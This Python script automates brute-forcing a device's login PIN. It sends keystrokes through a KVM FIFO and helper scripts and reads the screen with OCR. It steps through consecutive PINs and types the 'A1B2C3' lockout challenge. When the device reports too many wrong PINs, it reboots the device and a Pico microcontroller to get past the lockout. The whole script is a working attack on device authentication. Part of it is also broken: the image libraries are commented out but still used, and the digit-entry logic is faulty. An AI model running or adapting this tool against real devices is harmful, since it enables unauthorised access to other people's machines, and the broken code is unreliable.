#!/usr/bin/env python3

from io import BytesIO, TextIOWrapper
import re
import sys
import threading
import time
import os

# $ pip install pytesseract serial
#from PIL import Image
#import pytesseract
import serial


READABLE_LINES = [
    b'--frame\r\n',
    b'Content-Type: image/jpeg\r\n',
    b'Content-Length: ',
]

state = "booting"
state_iter = 0
kvm_fifo: TextIOWrapper

curr_pin = 123222

def find_in_screen(screen: str, text: str) -> bool:
    return re.sub("[\n\r\t ]", "", text).lower() in re.sub("[\n\r\t ]", "", screen).lower()


def do_serial(msg: bytes, wait_read: bool = False):
    con = serial.Serial('/dev/ttyACM0', baudrate=115200, timeout=3)
    con.write(msg)

    if wait_read:
        con.readall()
    
    con.close()


def restart():
    print("entering reboot key sequence", file=sys.stderr)
    time.sleep(1)
    kvm_fifo.write("./press-tab.sh\nsleep 0.1\n")
    kvm_fifo.write("./press-tab.sh\nsleep 0.1\n")
    kvm_fifo.write("./press-tab.sh\nsleep 0.1\n")
    kvm_fifo.write("./press-return.sh\nsleep 0.1\n")
    kvm_fifo.write("./press-down.sh\nsleep 0.1\n")
    # on shutdown now
    kvm_fifo.write("./press-down.sh\nsleep 0.1\n")
    # on reboot now
    kvm_fifo.write("./press-return.sh\nsleep 0.1\n")
    kvm_fifo.write("./press-return.sh\nsleep 0.1\n")

    time.sleep(15)

    print("Rebooting Pico")
    os.system("/usr/bin/picotool reboot -f")
    time.sleep(2)
    do_serial(b'r', True)

    print("Rebooting Pico")
    os.system("/usr/bin/picotool reboot -f")
    time.sleep(2)
    do_serial(b'a')



def ocr(image_bytes):
    global state
    global state_iter
    global curr_pin
    global kvm_fifo

    image = Image.open(BytesIO(image_bytes))

    state_iter += 1

    if state == "booting":
        image = image.crop((750, 190, 750 + 420, 190 + 200))
    #elif state == "login" or state == "check":
    #    image = image.crop((750, 595, 750 + 420, 595 + 200))
    #    #image = image.crop((750, 600, 750 + 420, 600 + 200))
    #elif state == "check":

    screen = pytesseract.image_to_string(image)
    screen = re.sub("[\n\r\t ]", "", screen).lower()
    print(f"{state}", file=sys.stderr)
    if screen:
        print(screen)

    if state == "booting":
        if not find_in_screen(screen, "Thursday, 2 April"):
            return

        state = "login"
        state_iter = 0
        # sometimes the return comes to early and we're stuck in "login?"
        time.sleep(2)
        print("pressing enter", file=sys.stderr)
        kvm_fifo.write("/root/press-return.sh\n")
        time.sleep(0.2)
        return

    elif state.startswith("login"):
        if state != "login_only" and (find_in_screen(screen, "A1B2C3") or find_in_screen(screen, "several times")):
            print("entering a1b2c3", file=sys.stderr)
            kvm_fifo.write("/root/enter-a1b2c3.sh\n")
            time.sleep(0.7)
            print("pressing enter", file=sys.stderr)
            kvm_fifo.write("/root/press-return.sh\n")
            time.sleep(0.5)
            state = "login_only"
            state_iter = 0

        elif find_in_screen(screen, "incorrect PIN too many") or find_in_screen(screen, "restart your device") or find_in_screen(screen, "PIN is disabled"):
            restart()
            state = "booting"
            state_iter = 0

        elif find_in_screen(screen, "Enter your PIN"):
            # enter PIN
            print(f"entering {curr_pin}", file=sys.stderr)
            for c in str(curr_pin):
                kvm_fifo.write(f"/root/press-number.sh {c}\n")
                time.sleep(0.2)
            time.sleep(1)
            curr_pin += 1
            state = "checking"
            state_iter = 0

        else:
            if state_iter >= 3:
                print("timeout. trying again with booting", file=sys.stderr)
                state = "booting"
                state_iter = 0

    elif state == "checking":

        #if find_in_screen(screen, "A1B2C3") or find_in_screen(screen, "several times"):
        #    print("entering a1b2c3", file=sys.stderr)
        #    kvm_fifo.write("/root/enter-a1b2c3.sh\n")
        #    time.sleep(0.7)
        #    print("pressing enter", file=sys.stderr)
        #    kvm_fifo.write("/root/press-return.sh\n")
        #    time.sleep(0.5)
        #    state = "login_only"
        #    state_iter = 0

        if find_in_screen(screen, "incorrect PIN too many") or find_in_screen(screen, "restart your device") or find_in_screen(screen, "PIN is disabled"):
            restart()
            state = "booting"
            state_iter = 0

        elif find_in_screen(screen, "The PIN is incorrect"):
            print("pressing enter", file=sys.stderr)
            kvm_fifo.write("/root/press-return.sh\n")
            time.sleep(0.2)
            state = "login"
            state_iter = 0

    else:
        print(f"success? {curr_pin}")


def timing():
    global curr_pin
    global kvm_fifo

    print("waiting for boot")
    time.sleep(40)

    kvm_fifo.write("/etc/init.d/S03usbdev restart_phy\n")
    time.sleep(2)

    print("pressing enter", file=sys.stderr)
    kvm_fifo.write("/root/press-return.sh\n")
    time.sleep(0.5)

    # enter PIN
    for i in range(4):
        print(f"entering PIN {i+1} {curr_pin}", file=sys.stderr)
        for c in str(curr_pin):
            kvm_fifo.write(f"/root/press-number.sh {c}\n")
            time.sleep(0.1)
        
        curr_pin+=1
        time.sleep(0.5) # fixme: remove
        print("pressing enter", file=sys.stderr)
        kvm_fifo.write("/root/press-return.sh\n")
        time.sleep(0.5)
    time.sleep(0.5)

    print("entering a1b2c3", file=sys.stderr)
    kvm_fifo.write("/root/enter-a1b2c3.sh\n")
    time.sleep(0.5)
    print("pressing enter", file=sys.stderr)
    kvm_fifo.write("/root/press-return.sh\n")
    time.sleep(0.5)

    print(f"entering PIN 5 {curr_pin}", file=sys.stderr)
    for c in str(curr_pin):
        kvm_fifo.write(f"/root/press-number.sh {c}\n")
        time.sleep(0.1)
    
    curr_pin+=1

    print("pressing enter", file=sys.stderr)
    time.sleep(0.5)
    kvm_fifo.write("/root/press-return.sh\n")

    restart()

def intel():
    global curr_pin
    global kvm_fifo

    #kvm_fifo.write("/etc/init.d/S03usbdev restart_phy\n")
    #time.sleep(2)

    print(f"entering PIN {curr_pin}", file=sys.stderr)
    for c in str(curr_pin):
        kvm_fifo.write(f"/root/press-number.sh {c}\n")
        time.sleep(0.1)
    curr_pin += 1

    for _ in range(31):
        if (curr_pin == 123457):
            exit(0)

        print(f"entering PIN {curr_pin}", file=sys.stderr)
        if curr_pin % 100 == 0:
            kvm_fifo.write("/root/press-backspace.sh\n")
            time.sleep(0.05)
            kvm_fifo.write("/root/press-backspace.sh\n")
            time.sleep(0.05)
            kvm_fifo.write("/root/press-backspace.sh\n")
            time.sleep(0.05)
            kvm_fifo.write(f"/root/press-number.sh {curr_pin % 1000}\n")
            time.sleep(0.05)
            kvm_fifo.write(f"/root/press-number.sh {curr_pin % 100}\n")
            time.sleep(0.05)
            kvm_fifo.write(f"/root/press-number.sh {curr_pin % 10}\n")
            time.sleep(0.05)
        elif curr_pin % 10 == 0:
            kvm_fifo.write("/root/press-backspace.sh\n")
            time.sleep(0.05)
            kvm_fifo.write("/root/press-backspace.sh\n")
            time.sleep(0.05)
            kvm_fifo.write(f"/root/press-number.sh {curr_pin % 100}\n")
            time.sleep(0.05)
            kvm_fifo.write(f"/root/press-number.sh {curr_pin % 10}\n")
            time.sleep(0.05)
        else:
            kvm_fifo.write("/root/press-backspace.sh\n")
            time.sleep(0.05)
            kvm_fifo.write(f"/root/press-number.sh {curr_pin % 10}\n")
            time.sleep(0.05)

        kvm_fifo.write("/root/press-return.sh\n")
        time.sleep(0.1)

        curr_pin += 1

def main(args):
    thread = None
    now = 0
    # TODO: do we want this?
    delta = 0

    if len(args) > 0:
        global kvm_fifo
        kvm_fifo = open(args[0], "a", 1)
        print("opened fifo")
    else:
        print("need a file path", file=sys.stderr)
        return 1

    if len(args) > 1:
        delta = int(args[1])

    while True:
        input()
        intel()
        # line = b''
        # for i in range(len(READABLE_LINES)):
        #     line = sys.stdin.buffer.readline()
        #     if not line.startswith(READABLE_LINES[i]):
        #         print("Corrupt input", file=sys.stderr)
        #         return 1

        # if sys.stdin.buffer.readline() != b'\r\n':
        #     print("Corrupt input", file=sys.stderr)
        #     return 1

        # line = line[len(READABLE_LINES[-1]):].strip()
        # size = int(line.decode('ascii'))
        # #print(now, time.time())

        # image = sys.stdin.buffer.read(size)
        # if not image.startswith(b'\xff\xd8'):
        #     print("Wrong start", file=sys.stderr)
        #     return 1
        # if not image.endswith(b'\xff\xd9'):
        #     print("Wrong end", file=sys.stderr)
        #     return 1

        # if (now + delta <= time.time()) and (thread is None or not thread.is_alive()):
        #     thread = threading.Thread(target=ocr, args=(image,))
        #     thread.start()
        #     #print(pytesseract.image_to_string(Image.open(io.BytesIO(image))))
        #     now = time.time()
        # else:
        #     #print("skip", file=sys.stderr)
        #     pass

        # if sys.stdin.buffer.readline() != b'\r\n':
        #     print("Corrupt input", file=sys.stderr)
        #     return 1

    return 0

if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
